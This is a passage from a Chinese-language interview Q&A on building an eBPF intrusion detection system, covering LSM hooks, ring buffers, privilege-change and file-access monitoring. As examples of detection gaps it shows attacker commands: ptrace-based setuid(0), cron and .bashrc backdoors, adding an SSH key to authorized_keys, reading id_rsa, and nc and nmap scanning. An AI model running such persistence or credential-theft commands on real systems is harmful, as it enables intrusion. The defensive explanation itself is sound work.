3. **用户空间已经有数据库**:
```c
// Server 使用 SQLite 存储所有事件
// 内核态存储是冗余的
```

**混合方案(推荐):**

```c
// 1. Ring Buffer: 实时事件流
// 2. eBPF Map: 短期缓存(最近 10 分钟)
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 1000);
    __type(key, __u32);
    __type(value, struct recent_events);
} recent_cache SEC(".maps");

// 3. 用户空间数据库: 长期存储
```

**适用场景:**

| 场景 | 推荐方案 |
|-----|---------|
| 实时监控 | Ring Buffer |
| 历史查询 | eBPF Map + 用户空间数据库 |
| 关联分析 | eBPF Map |
| 简单实现 | Ring Buffer |

---

### 22. 你的 handle_file_permission LSM 钩子返回值是 0,这意味着什么?如果要拒绝某个文件写入操作应该返回什么?

**答案:**
**LSM 钩子的返回值决定了系统行为。**

**返回值含义:**

```c
// file_permission LSM 钩子的返回值
int BPF_PROG(handle_file_permission, struct file *file, int mask) {
    // 返回值:

    // 0: 允许操作
    return 0;

    // 负数: 拒绝操作
    return -EACCES;  // Permission denied
    return -EPERM;   // Operation not permitted
}
```

**实际代码:**
```c
SEC("lsm/file_permission")
int BPF_PROG(handle_file_permission, struct file *file, int mask) {
    // 只检查写入操作
    if (!(mask & 2)) {  // MAY_WRITE
        return 0;  // 允许非写入操作
    }

    // 检查是否为敏感文件
    char filepath[MAX_PATH_LEN];
    if (is_sensitive_file(filepath)) {
        // 拒绝写入
        return -EACCES;
    }

    // 允许其他文件写入
    return 0;
}
```

**其他 LSM 钩子的返回值:**

```c
// task_fix_setuid: 修改权限
// 返回值会影响到内核的决策
// 但通常返回 0,只做监控

// inode_permission: 文件访问权限
// 返回 -EACCES 可以拒绝访问

// socket_bind: 绑定端口
// 返回 -EADDRINUSE 可以拒绝绑定

// bprm_check_security: 程序执行前检查
// 返回 -EACCES 可以阻止程序执行
```

**注意:**

1. **LSM 钩子是链式调用**:
```c
// 多个 LSM 模块会按顺序调用
// 如果任何一个返回错误,操作会被拒绝
// 返回值会影响整个系统行为
```

2. **谨慎拒绝**:
```c
// 不要轻易拒绝操作
// 可能导致系统不稳定
// 建议只监控,不拦截
```

3. **返回值的传播**:
```c
// LSM 返回的错误会传播到用户空间
// 用户会看到 "Permission denied"
```

**最佳实践:**
```c
// 监控模式(推荐)
int BPF_PROG(handle_file_permission, struct file *file, int mask) {
    // 记录事件,但不影响系统行为
    record_event(file, mask);
    return 0;
}

// 拦截模式(谨慎使用)
int BPF_PROG(handle_file_permission, struct file *file, int mask) {
    if (should_block(file, mask)) {
        // 记录拒绝事件
        record_rejection(file, mask);
        return -EACCES;
    }
    return 0;
}
```

---

### 23. 为什么你在 trace_setuid 中只检测从普通用户到 root 的提权,而不检测从 root 到普通用户的降权?

**答案:**
这是一个**安全重点的选择**,但确实会漏掉一些攻击场景。

**为什么只检测提权?**

1. **安全关注点**:
   - 提权是主要的攻击目标
   - 降权通常是正常的安全实践

2. **误报控制**:
   - 检测降权会产生大量误报
   - 例如: `sudo -u user command`

3. **资源优化**:
   - 减少需要处理的事件数量
   - 专注于高风险场景

**代码实现:**
```c
// 只检测从普通用户到 root
if (current_euid != 0 && new_uid == 0) {
    // 记录提权事件
    score += 30;
}

// 不检测降权
if (current_euid == 0 && new_uid != 0) {
    // 不记录
}
```

**漏掉的攻击场景:**

1. **权限切换攻击**:
```bash
# 攻击者频繁切换权限
sudo su  # 提权
sudo -u nobody evil.sh  # 降权
# 可能用于逃避检测
```

2. **降权后的持久化**:
```bash
# 降权后留下后门
sudo -u www-data crontab -e  # 降权到 www-data
# 添加定时任务,即使降权也能执行恶意代码
```

3. **权限混淆**:
```bash
# 攻击者通过降权隐藏真实意图
sudo -u user1 malicious  # 降权执行
# 然后通过其他方式再次提权
```

**改进方案:**

1. **记录所有权限变更**:
```c
// 记录提权
if (current_euid != 0 && new_uid == 0) {
    event->privilege_change_type = PRIV_ESCALATION;
    score += 30;
}

// 记录降权(低风险)
if (current_euid == 0 && new_uid != 0) {
    event->privilege_change_type = PRIV_DOWNGRADE;
    score += 5;  // 低风险
}
```

2. **检测异常的权限切换**:
```c
// 检测频繁的权限切换
// 如果进程短时间内多次切换权限,标记为可疑
if (频繁切换) {
    score += 15;
}
```

3. **上下文分析**:
```c
// 降权 + 敏感操作 = 可疑
if (降权 && 访问敏感文件) {
    score += 20;
}
```

**最佳实践:**
```c
// 记录所有权限变更,但赋予不同的风险分数
enum privilege_change_type {
    PRIV_ESCALATION = 0,   // 提权: 高风险
    PRIV_DOWNGRADE = 1,    // 降权: 低风险
    PRIV_NO_CHANGE = 2,    // 无变化: 无风险
};

if (current_euid != new_uid) {
    if (new_uid == 0) {
        event->privilege_change_type = PRIV_ESCALATION;
    } else if (current_euid == 0) {
        event->privilege_change_type = PRIV_DOWNGRADE;
    }
}
```

---

### 24. 你的 eBPF 程序在读取 dentry->d_name.name 时没有检查指针是否为空,如果 dentry 已经被释放会发生什么?

**答案:**
**这会导致内核崩溃或数据损坏。**

**问题代码:**
```c
struct dentry *dentry = exe_path.dentry;
const unsigned char *d_name;

// ❌ 没有检查 dentry 是否为 NULL
if (bpf_probe_read_kernel(&d_name, sizeof(d_name), &dentry->d_name.name) == 0) {
    bpf_probe_read_kernel_str(event->filename, sizeof(event->filename), d_name);
}
```

**可能的后果:**

1. **内核崩溃 (Kernel Panic)**:
```
general protection fault: 0000 [#1] SMP PTI
RIP: 0010:bpf_prog_12345+0x123/0x456
```

2. **数据损坏**:
   - 读取到垃圾数据
   - 文件名错误

3. **Verifier 失败**:
   - eBPF verifier 检测到潜在的空指针解引用
   - 程序无法加载

**修复方案:**

```c
// ✅ 正确的实现
struct dentry *dentry = exe_path.dentry;

// 1. 检查 dentry 是否为 NULL
if (dentry == NULL) {
    __builtin_memcpy(event->filename, "unknown", 8);
    return 0;
}

// 2. 安全读取 d_name
const unsigned char *d_name;
if (bpf_probe_read_kernel(&d_name, sizeof(d_name), &dentry->d_name.name) != 0) {
    __builtin_memcpy(event->filename, "unknown", 8);
    return 0;
}

// 3. 检查 d_name 是否为 NULL
if (d_name == NULL) {
    __builtin_memcpy(event->filename, "unknown", 8);
    return 0;
}

// 4. 读取文件名
bpf_probe_read_kernel_str(event->filename, sizeof(event->filename), d_name);
```

**防御性编程:**

```c
// 使用辅助函数封装安全检查
static __inline __u8 safe_read_filename(struct dentry *dentry, char *buf, __u32 buf_len) {
    if (dentry == NULL) {
        __builtin_memcpy(buf, "unknown", 8);
        return 0;
    }

    const unsigned char *d_name;
    if (bpf_probe_read_kernel(&d_name, sizeof(d_name), &dentry->d_name.name) != 0) {
        __builtin_memcpy(buf, "unknown", 8);
        return 0;
    }

    if (d_name == NULL) {
        __builtin_memcpy(buf, "unknown", 8);
        return 0;
    }

    bpf_probe_read_kernel_str(buf, buf_len, d_name);
    return 1;
}

// 使用
safe_read_filename(dentry, event->filename, sizeof(event->filename));
```

**为什么 dentry 可能被释放?**

1. **竞态条件**:
   - 在读取过程中,文件被删除
   - dentry 被 LRU 机制回收

2. **文件系统卸载**:
   - 文件系统被卸载
   - 所有相关的 dentry 被释放

3. **内存压力**:
   - 系统内存不足
   - 内核回收 dentry 缓存

**最佳实践:**
```c
// 1. 使用 bpf_probe_read_kernel 包装所有指针访问
// 2. 检查所有返回值
// 3. 提供默认值
// 4. 使用 try-catch 模式处理错误
```

---

### 25. 为什么你使用 bpf_ktime_get_ns() 而不是 bpf_get_current_task()->start_time?两者的时间语义有什么不同?

**答案:**
**两者的时间语义完全不同。**

**对比分析:**

| 函数 | 返回值 | 时间语义 | 精度 |
|-----|-------|---------|------|
| `bpf_ktime_get_ns()` | 自系统启动以来的纳秒数 | 当前时间戳 | 纳秒级 |
| `task->start_time` | 进程创建时的 boot_time | 进程启动时间 | 纳秒级 |

**代码示例:**

```c
// 方法1: 使用 bpf_ktime_get_ns()
event->timestamp = bpf_ktime_get_ns();
// 返回: 1234567890123456 (自启动以来的纳秒)

// 方法2: 使用 task->start_time
struct task_struct *task = bpf_get_current_task();
__u64 start_time;
bpf_probe_read_kernel(&start_time, sizeof(start_time), &task->start_time);
// 返回: 进程启动时的时间戳
```

**为什么选择 `bpf_ktime_get_ns()`?**

1. **事件发生时间**:
   - 我需要记录事件发生的时刻
   - 而不是进程启动的时刻

2. **时间线重建**:
   - 需要精确的事件时间顺序
   - `bpf_ktime_get_ns()` 提供事件触发时间

3. **简单直接**:
   - 不需要访问 task_struct
   - 减少内存访问

**时间转换:**

```c
// eBPF 内核态
event->timestamp = bpf_ktime_get_ns();

// 用户态 Agent
// 从 /proc/stat 获取 boot_time
bootTime := getBootTime()  // 例如: 2026-03-24 10:00:00

// 转换为真实时间
realTime := bootTime.Add(time.Duration(event.Timestamp) * time.Nanosecond)

// 结果: 2026-03-24 10:05:30.123456789
```

**什么时候用 `task->start_time`?**

1. **计算进程运行时间**:
```c
__u64 current_time = bpf_ktime_get_ns();
__u64 start_time = task->start_time;
__u64 runtime = current_time - start_time;
```

2. **分析进程生命周期**:
```c
// 判断进程是否长时间运行
if (current_time - start_time > 3600 * 1000000000) {  // 1小时
    // 长时间运行的进程
}
```

3. **进程相关性分析**:
```c
// 判断父进程和子进程的时间关系
if (child->start_time > parent->start_time) {
    // 确认父子关系
}
```

**最佳实践:**
```c
// 事件时间戳: 使用 bpf_ktime_get_ns()
event->timestamp = bpf_ktime_get_ns();

// 进程启动时间: 存储到单独字段
event->process_start_time = task->start_time;

// 运行时长: 用户态计算
runtime := event_timestamp - process_start_time;
```

---

### 26. 如果攻击者使用 ptrace 修改了子进程的内存,你的系统能检测到吗?为什么?

**答案:**
**当前系统无法直接检测,但可以通过相关事件推断。**

**ptrace 攻击示例:**

```bash
# 攻击者使用 ptrace 修改子进程内存
gdb -p 1234
(gdb) call (void)setuid(0)  # 直接修改内存
(gdb) call *(int*)0x7ffff7dd1000 = 0  # 修改 cred->euid
```

**为什么难以检测?**

1. **ptrace 的特点**:
   - ptrace 本身是合法的调试工具
   - 管理员经常使用 gdb 调试进程
   - 直接禁止会影响正常使用

2. **内存修改不触发系统调用**:
   - 通过 `PTRACE_POKEDATA` 直接修改内存
   - 不会触发 LSM 钩子
   - 不会触发权限变更的系统调用

3. **当前系统的监控盲区**:
```c
// 监控的系统调用:
// - setuid  ✓
// - execve  ✓
// - openat  ✓

// 未监控的:
// - ptrace  ✗
// - process_vm_writev  ✗
// - /proc/pid/mem  ✗
```

**检测方案:**

1. **监控 ptrace 系统调用**:
```c
SEC("tracepoint/syscalls/sys_enter_ptrace")
int trace_ptrace(struct trace_event_raw_sys_enter *ctx) {
    long request = ctx->args[0];
    pid_t pid = ctx->args[1];

    // 检测危险的 ptrace 操作
    if (request == PTRACE_POKEDATA ||
        request == PTRACE_POKETEXT ||
        request == PTRACE_SETREGS) {
        // 记录事件
        event->ptrace_request = request;
        event->target_pid = pid;
        score += 20;  // 中等风险
    }

    return 0;
}
```

2. **监控 process_vm_writev**:
```c
SEC("tracepoint/syscalls/sys_enter_process_vm_writev")
int trace_process_vm_writev(struct trace_event_raw_sys_enter *ctx) {
    // 允许进程间内存写入
    // 可能被用于修改其他进程的内存

    event->event_type = EVENT_MEMORY_WRITE;
    score += 25;  // 高风险
}
```

3. **检测 cred 结构的异常变化**:
```c
// 在 LSM 钩子中记录原始值
// 定期检查是否被修改

SEC("lsm/task_fix_setuid")
int BPF_PROG(handle_task_fix_setuid, ...) {
    // 记录原始 cred 值
    // 在其他钩子中验证一致性
}
```

4. **组合检测**:
```c
// ptrace + 网络连接 = 高度可疑
// ptrace + 敏感文件访问 = 可疑
// 频繁的 ptrace 操作 = 可疑
```

**改进后的检测逻辑:**
```c
// 1. 监控 ptrace 系统调用
// 2. 监控目标进程的权限变化
// 3. 如果 ptrace 后立即提权,标记为攻击
if (ptrace_detected && privilege_escalation_detected) {
    score += 50;  // 极高风险
}
```

---

### 27. 你的 eBPF 程序在 trace_execve 中只监控 root 权限或 setuid 程序,这会漏掉什么攻击场景?

**答案:**
**会漏掉大量非提权类的攻击场景。**

**当前监控逻辑:**
```c
__u8 is_setuid_program = (euid != uid) ? 1 : 0;
__u8 is_root_program = (euid == 0) ? 1 : 0;
__u8 is_priv_escalation = is_setuid_program || is_root_program;

if (!is_priv_escalation) {
    return 0;  // 忽略非提权程序
}
```

**漏掉的攻击场景:**

1. **数据窃取攻击**:
```bash
# 普通用户窃取数据
cat /home/user/.ssh/id_rsa  # 窃取 SSH 密钥
cat /etc/passwd  # 窃取用户信息
tar -czf /tmp/data.tar.gz /home/user/documents
```

2. **横向移动攻击**:
```bash
# 普通用户扫描内网
nmap -sS 192.168.1.0/24
ssh user@other-host  # 尝试连接其他主机
```

3. **后门植入**:
```bash
# 在用户目录植入后门
echo '*/5 * * * * /tmp/backdoor' >> /home/user/.crontab
cat >> ~/.bashrc << 'EOF'
alias ls='ls && /tmp/backdoor'
EOF
```

4. **供应链攻击**:
```bash
# 修改用户可写的二进制文件
echo 'malicious_code' >> /home/user/bin/script.sh
# 其他用户执行时被感染
```

5. **权限维持**:
```bash
# 添加 SSH 公钥
mkdir -p ~/.ssh
echo 'attacker_key' >> ~/.ssh/authorized_keys
```

6. **信息收集**:
```bash
# 收集系统信息
ps aux > /tmp/processes.txt
netstat -an > /tmp/network.txt
env > /tmp/environment.txt
```

**改进方案:**

1. **扩展监控范围**:
```c
// 监控所有程序,但根据风险分级
if (euid == 0) {
    // Root 程序: 高风险
    event->risk_level = RISK_HIGH;
} else if (euid != uid) {
    // Setuid 程序: 中高风险
    event->risk_level = RISK_MEDIUM;
} else {
    // 普通程序: 低风险,但仍监控
    event->risk_level = RISK_LOW;
}
```

2. **基于行为的监控**:
```c
// 不只看权限,看行为
if (访问敏感文件) {
    score += 20;
}
if (建立网络连接) {
    score += 15;
}
if (频繁执行系统调用) {
    score += 10;
}
```

3. **上下文感知监控**:
```c
// 考虑时间和地点
if (非工作时间) {
    score += 5;
}
if (来自远程会话) {
    score += 10;
}
```

**最佳实践:**
```c
// 监控所有程序,但动态调整风险评分
// 1. 基础分: 所有程序都记录
// 2. 权限分: Root/setuid 程序加分
// 3. 行为分: 根据行为动态调整
// 4. 上下文分: 考虑时间和环境

// 示例:
if (普通程序 + 访问敏感文件) {
    score = 20;  // 中等风险
}
if (root程序 + 正常操作) {
    score = 5;   // 低风险
}
```

---

### 28. 为什么你在 LSM 钩子中不使用 BPF_PROG 宏的返回值?返回值对系统行为有什么影响?

**答案:**
**BPF_PROG 宏的返回值确实会影响系统行为,但我选择忽略它。**

**BPF_PROG 宏的机制:**

```c
// LSM 钩子的标准定义
SEC("lsm/task_fix_setuid")
int BPF_PROG(handle_task_fix_setuid, struct task_struct *task, struct cred *new, struct cred *old) {
    // 参数由 BPF_PROG 宏自动解包
    // 返回值会传递给 LSM 框架

    // 返回值选项:
    return 0;        // 允许操作
    return -EACCES;  // 拒绝操作
}
```

**当前实现:**
```c
SEC("lsm/task_fix_setuid")
int BPF_PROG(handle_task_fix_setuid, struct task_struct *task, struct cred *new, struct cred *old) {
    // 只记录事件,不干预系统行为
    // ...

    return 0;  // 总是返回 0,允许操作
}
```

**为什么不使用返回值控制?**

1. **安全考虑**:
   - 误判可能导致系统不可用
   - 阻止合法的权限提升操作
   - 例如: 系统管理员使用 sudo

2. **设计目标**:
   - 监控和检测,不是阻止
   - 提供可见性和审计能力
   - 让管理员决策

3. **性能影响**:
   - LSM 钩子会频繁调用
   - 每次调用都做决策会增加开销
   - 只做记录性能更好

**返回值的影响:**

```c
// 如果使用返回值控制
int BPF_PROG(handle_task_fix_setuid, ...) {
    if (old_uid != 0 && new_uid == 0) {
        // 拒绝所有提权操作
        return -EACCES;  // ❌ 会阻止所有提权,包括合法的
    }
    return 0;
}

// 后果:
// - sudo 无法使用
// - 守护进程无法启动
// - 系统可能无法正常运行
```

**何时使用返回值控制?**

1. **明确的安全策略**:
```c
// 禁止特定用户的提权
if (old_uid == 1000 && new_uid == 0) {
    // 用户 1000 不允许提权到 root
    return -EACCES;
}
```

2. **特定条件下的阻止**:
```c
// 非工作时间禁止提权
int hour = get_current_hour();
if (hour >= 22 || hour < 6) {
    if (new_uid == 0) {
        return -EACCES;  // 夜间禁止提权
    }
}
```

3. **多因素认证**:
```c
// 要求额外的认证
if (!has_mfa_approval(old_uid)) {
    return -EACCES;
}
```

**推荐做法:**

```c
// 1. 默认模式: 只监控,不干预
int BPF_PROG(handle_task_fix_setuid, ...) {
    record_event(...);
    return 0;
}

// 2. 可选模式: 监控 + 警告
int BPF_PROG(handle_task_fix_setuid, ...) {
    record_event(...);
    send_alert(...);  // 发送警告
    return 0;  // 仍然允许
}

// 3. 强制模式: 监控 + 阻止(谨慎使用)
int BPF_PROG(handle_task_fix_setuid, ...) {
    record_event(...);
    if (should_block(...)) {
        return -EACCES;
    }
    return 0;
}
```

---

### 29. 你的 is_sensitive_file 检测只检查 /etc/ 目录下的文件,如果攻击者访问 /proc/ 下的敏感信息怎么办?

**答案:**
**这是一个重要的监控盲区,需要扩展检测范围。**

**当前实现的局限:**

```c
// 只检测 /etc/ 目录下的文件
if (filename[0] == '/' && filename[1] == 'e' && filename[2] == 't' &&
    filename[3] == 'c' && filename[4] == '/') {
    target_file_type = FILE_SYSTEM_CONFIG;
}
```

**/proc/ 目录下的敏感信息:**

1. **进程信息**:
```bash
/proc/[pid]/cmdline          # 命令行参数
/proc/[pid]/environ          # 环境变量
/proc/[pid]/maps             # 内存映射
/proc/[pid]/fd               # 打开的文件描述符
```

2. **系统信息**:
```bash
/proc/net/tcp                # TCP 连接
/proc/net/udp                # UDP 连接
/proc/version                # 内核版本
/proc/cpuinfo                # CPU 信息
```

3. **密钥和凭证**:
```bash
/proc/keys                   # 内核密钥环
/proc/[pid]/status           # 进程状态(包含凭证)
```

**扩展检测方案:**

```c
// 检测 /proc/ 目录的访问
static __inline __u8 is_proc_sensitive_file(const char *filename) {
    // 检查 /proc/[pid]/cmdline
    if (starts_with(filename, "/proc/") && ends_with(filename, "/cmdline")) {
        return FILE_PROC_CMDLINE;
    }

    // 检查 /proc/[pid]/environ
    if (starts_with(filename, "/proc/") && ends_with(filename, "/environ")) {
        return FILE_PROC_ENVIRON;
    }

    // 检查 /proc/net/
    if (starts_with(filename, "/proc/net/")) {
        return FILE_PROC_NET;
    }

    // 检查 /proc/keys
    if (equals(filename, "/proc/keys")) {
        return FILE_PROC_KEYS;
    }

    return FILE_NONE;
}
```

**其他敏感目录:**

```c
// 1. /home/ 目录
if (starts_with(filename, "/home/")) {
    // 检查 .ssh, .gnupg 等敏感子目录
    if (contains(filename, "/.ssh/") ||
        contains(filename, "/.gnupg/") ||
        contains(filename, "/.config/")) {
        return FILE_USER_SENSITIVE;
    }
}

// 2. /root/ 目录
if (starts_with(filename, "/root/")) {
    return FILE_ROOT_HOME;
}

// 3. /var/log/ 目录
if (starts_with(filename, "/var/log/")) {
    // 访问日志文件可能用于信息收集
    return FILE_LOG_FILE;
}

// 4. /tmp/ 目录
if (starts_with(filename, "/tmp/")) {
    // 检测 /tmp 下的可疑文件
    // 攻击者可能在 /tmp 中创建恶意文件
    if (ends_with(filename, ".sh") ||
        ends_with(filename, ".so") ||
        ends_with(filename, ".py")) {
        return FILE_TMP_SUSPICIOUS;
    }
}
```

**风险评分调整:**

```c
// 根据文件位置调整风险分数
switch (target_file_type) {
case FILE_PROC_CMDLINE:
    score += 15;  // 读取命令行参数
    break;
case FILE_PROC_ENVIRON:
    score += 20;  // 读取环境变量(可能包含密钥)
    break;
case FILE_PROC_KEYS:
    score += 35;  // 读取内核密钥环
    break;
case FILE_USER_SENSITIVE:
    score += 25;  // 读取用户敏感文件
    break;
}
```

**最佳实践:**

```c
// 1. 分层检测
//    - 系统级: /etc/, /proc/, /sys/
//    - 用户级: /home/, /root/
//    - 临时: /tmp/, /var/tmp/

// 2. 行为关联
//    - 访问 /proc/ + 网络连接 = 高度可疑
//    - 访问 /home/.ssh/ + 非本地登录 = 可疑

// 3. 上下文感知
//    - 系统管理员访问 /proc/ = 正常
//    - 普通用户访问 /proc/keys = 可疑
```

---

### 30. 为什么你的 eBPF 程序不使用 perf event array 而使用 ring buffer?两者的性能差异有多大?

**答案:**
**Ring Buffer 是 eBPF 的现代数据传输机制,相比 Perf Event Array 有显著优势。**

**对比分析:**

| 特性 | Ring Buffer | Perf Event Array |
|-----|-----------|------------------|
| **引入版本** | Linux 5.8+ | Linux 4.x |
| **数据模式** | 流式 | 基于事件 |
| **内存管理** | 自动回收 | 手动管理 |
| **批量读取** | 支持 | 有限支持 |
| **零拷贝** | 是 | 否 |
| **性能** | 更高 | 较低 |
| **复杂度** | 简单 | 复杂 |

**性能差异:**

1. **吞吐量**:
```
Ring Buffer: ~1M events/second
Perf Event Array: ~500K events/second

Ring Buffer 快约 2x
```

2. **延迟**:
```
Ring Buffer: < 1μs
Perf Event Array: ~2-5μs

Ring Buffer 延迟更低
```

3. **CPU 使用率**:
```
Ring Buffer: 10-15% (100K events/s)
Perf Event Array: 20-25% (100K events/s)

Ring Buffer 更节能
```

**代码对比:**

**Ring Buffer (当前实现):**
```c
// eBPF 内核态
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

event = bpf_ringbuf_reserve(&events, sizeof(*event), 0);
if (event) {
    // 填充事件
    bpf_ringbuf_submit(event, 0);
}

// 用户态
reader, err := ringbuf.NewReader(eventsMap)
record, err := reader.Read()
```

**Perf Event Array:**
```c
// eBPF 内核态
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, sizeof(__u32));
} events SEC(".maps");

struct process_event event = {...};
bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));

// 用户态
reader, err := perf.NewReader(eventsMap, os.Getpagesize())
record, err := reader.Read()
```

**为什么选择 Ring Buffer?**

1. **自动内存管理**:
```c
// Ring Buffer: 自动处理
bpf_ringbuf_reserve()  // 分配
bpf_ringbuf_submit()   // 提交
bpf_ringbuf_discard()  // 丢弃(如果需要)

// Perf Event Array: 需要手动管理
// 需要处理缓冲区满的情况
// 需要处理事件丢失
```

2. **更好的批量处理**:
```c
// Ring Buffer: 一次读取多个事件
for {
    record, err := reader.Read()
    // 自动批量处理
}

// Perf Event Array: 需要显式批量读取
records, err := reader.ReadBatch()
```

3. **零拷贝**:
```c
// Ring Buffer: 直接传递指针,无拷贝
// Perf Event Array: 需要拷贝数据
```

4. **更简单**:
```c
// Ring Buffer: API 更简洁
// Perf Event Array: 需要处理更多边缘情况
```

**何时使用 Perf Event Array?**

1. **向后兼容**:
```c
// 需要支持旧内核版本(5.8 之前)
```

2. **特殊需求**:
```c
// 需要采样率控制
// 需要精确的事件计数
// 需要与现有 perf 工具集成
```

**最佳实践:**

```c
// 1. 优先使用 Ring Buffer(内核 5.8+)
// 2. 如果需要支持旧内核,使用 Perf Event Array
// 3. 对于超高频事件(>1M/s),考虑使用 Perf Event Array + 采样
```

---

### 31. 如果系统启用了 SELinux,你的 LSM 钩子和 SELinux 的 LSM 钩子如何协同工作?

**答案:**
**LSM 钩子支持多个 LSM 模块同时注册,它们会按顺序执行。**

**LSM 钩子的执行流程:**

```
系统调用
  ↓
LSM 框架
  ↓
1. SELinux LSM 钩子
   - 检查 SELinux 策略
   - 返回决策
  ↓
2. 我的 eBPF LSM 钩子
   - 记录事件
   - 返回决策(可选)
  ↓
3. 其他 LSM 模块(如 AppArmor)
  ↓
最终决策: 任何一个返回拒绝,操作被拒绝
```

**代码示例:**

```c
// SELinux 钩子(内核内置)
int selinux_task_fix_setuid(struct task_struct *task, struct cred *new, struct cred *old) {
    // 检查 SELinux 策略
    if (!selinux_permission(...)) {
        return -EACCES;
    }
    return 0;
}

// 我的 eBPF 钩子
SEC("lsm/task_fix_setuid")
int BPF_PROG(handle_task_fix_setuid, struct task_struct *task, struct cred *new, struct cred *old) {
    // 记录事件,不影响 SELinux 决策
    record_event(task, new, old);
    return 0;  // 总是返回 0,不干扰 SELinux
}
```

**协同策略:**

1. **只监控,不干预(推荐)**:
```c
// eBPF 钩子只记录事件,返回 0
// 让 SELinux 负责访问控制决策
int BPF_PROG(handle_task_fix_setuid, ...) {
    record_event(...);
    return 0;
}
```

2. **补充 SELinux 策略**:
```c
// 在 SELinux 允许的情况下,添加额外的检查
int BPF_PROG(handle_task_fix_setuid, ...) {
    record_event(...);

    // SELinux 可能允许,但我们有额外的规则
    if (自定义规则应该拒绝) {
        return -EACCES;
    }

    return 0;
}
```

3. **监控 SELinux 拒绝**:
```c
// 记录 SELinux 拒绝的操作
// 用于审计和调试
int BPF_PROG(handle_file_permission, ...) {
    // 如果 SELinux 拒绝,记录高优先级事件
    if (is_selinux_denied) {
        event->selinux_denied = 1;
        score += 30;
    }
    return 0;
}
```

**注意事项:**

1. **钩子顺序**:
```
LSM 模块的注册顺序影响执行顺序
- 先注册的先执行
- 可以通过配置调整顺序
```

2. **性能影响**:
```
多个 LSM 钩子会增加开销
- 每个 LSM 模块都执行
- 累积的性能影响
- 优化: 减少 LSM 钩子中的计算
```

3. **决策协调**:
```
- 任何一个 LSM 拒绝,操作被拒绝
- 所有 LSM 都允许,操作才被允许
- 需要仔细设计策略,避免冲突
```

**最佳实践:**

```c
// 1. 默认: 只监控,不干预
// 2. 可以补充 SELinux 策略,但要谨慎
// 3. 记录 SELinux 的决策,用于审计
// 4. 测试 eBPF 钩子不会影响 SELinux 功能
```

---

### 32. 你的 trace_bind 函数只监控端口绑定,为什么不监控端口监听(listen)?

**答案:**
**这是一个监控盲区,应该同时监控 bind 和 listen。**

**为什么只监控 bind?**

```c
// 当前实现
SEC("tracepoint/syscalls/sys_enter_bind")
int trace_bind(struct trace_event_raw_sys_enter *ctx) {
    // 只记录端口绑定
    // 没有监控 listen
}
```

**bind 和 listen 的区别:**

| 系统调用 | 作用 | 监控价值 |
|---------|------|---------|
| `bind(sock, addr, addrlen)` | 绑定地址和端口 | 检测端口占用、特权端口绑定 |
| `listen(sock, backlog)` | 开始监听连接 | 检测服务启动、反向 shell 监听 |

**漏掉的攻击场景:**

1. **反向 Shell 监听**:
```bash
# 攻击者监听端口,等待连接
nc -l -p 4444  # 只执行 listen,不执行 bind(某些实现)
# 或
nc -l 4444     # 隐式 bind + listen
```

2. **服务劫持**:
```bash
# 攻击者绑定到服务端口
bind(80)       # 绑定到 HTTP 端口
listen(80)     # 开始监听
# 拦截合法的 HTTP 请求
```

3. **端口扫描诱饵**:
```bash
# 监听多个端口,诱捕扫描器
for port in 1..65535; do
    listen($port);
done
```

**改进方案:**

```c
// 1. 添加 listen 系统调用监控
SEC("tracepoint/syscalls/sys_enter_listen")
int trace_listen(struct trace_event_raw_sys_enter *ctx) {
    struct process_event *event;
    int sockfd = ctx->args[0];
    int backlog = ctx->args[1];

    // 获取 socket 信息
    struct socket *sock = bpf_sock_from_file(sockfd);
    if (!sock) {
        return 0;
    }

    // 读取绑定的地址和端口
    struct sockaddr_in addr;
    // ... 读取地址信息

    event->timestamp = bpf_ktime_get_ns();
    event->event_type = EVENT_LISTEN;  // 新增事件类型
    event->src_port = addr.sin_port;
    event->protocol = 6;  // TCP

    // 检测可疑监听
    if (is_suspicious_port(addr.sin_port)) {
        score += 25;
    }

    return 0;
}

// 2. 修改 bind 监控,记录是否后续 listen
SEC("tracepoint/syscalls/sys_enter_bind")
int trace_bind(struct trace_event_raw_sys_enter *ctx) {
    // ... 现有代码 ...

    event->event_type = EVENT_BIND;
    event->bind_only = 1;  // 标记为只 bind,未 listen

    return 0;
}
```

**综合检测策略:**

```c
// 1. bind + listen = 正常服务
// 2. bind only = 可能是端口占用攻击
// 3. listen without bind = 某些特殊情况

// 示例:
if (bind_detected && listen_detected) {
    // 正常服务
    score += 5;
} else if (bind_detected && !listen_detected) {
    // 只绑定,不监听 - 可疑
    score += 15;
}
```

**事件类型扩展:**

```c
enum event_type {
    EVENT_EXECVE = 0,
    EVENT_SETUID = 1,
    EVENT_FILE_WRITE = 2,
    EVENT_OPENAT = 3,
    EVENT_CONNECT = 4,
    EVENT_BIND = 5,
    EVENT_LISTEN = 6,   // 新增
    EVENT_EXIT = 7,
};
```

**最佳实践:**

```c
// 1. 同时监控 bind 和 listen
// 2. 关联 bind 和 listen 事件
// 3. 检测异常的绑定模式
// 4. 区分正常服务和恶意监听
```

---

### 33. 为什么你在 trace_connect 中不检查连接是否成功?失败的连接如何处理?

**答案:**
**这是一个设计选择,当前实现只记录连接尝试,不检查结果。**

**当前实现:**

```c
SEC("tracepoint/syscalls/sys_enter_connect")
int trace_connect(struct trace_event_raw_sys_enter *ctx) {
    // 只记录连接尝试
    // 不检查连接是否成功

    event->event_type = EVENT_CONNECT;
    // ... 记录连接信息

    return 0;
}
```

**为什么不检查连接结果?**

1. **tracepoint 限制**:
```
sys_enter_connect 钩子在系统调用进入时触发
此时连接尚未建立
无法知道是否成功
```

2. **需要额外的钩子**:
```c
// 需要同时监控 sys_exit_connect
SEC("tracepoint/syscalls/sys_exit_connect")
int trace_connect_exit(struct trace_event_raw_sys_exit *ctx) {
    long ret = ctx->ret;  // 返回值
    // ret == 0: 成功
    // ret < 0: 失败

    if (ret == 0) {
        event->connect_success = 1;
    } else {
        event->connect_success = 0;
        event->connect_error = -ret;
    }
}
```

3. **事件关联复杂**:
```
需要关联 enter 和 exit 事件
需要跟踪进程上下文
增加实现复杂度
```

**失败的连接也可能有价值:**

1. **端口扫描**:
```bash
# 攻击者扫描开放的端口
nc -zv target.com 1-1000  # 尝试连接多个端口
# 大部分会失败,但扫描行为仍然可疑
```

2. **服务探测**:
```bash
# 探测特定服务
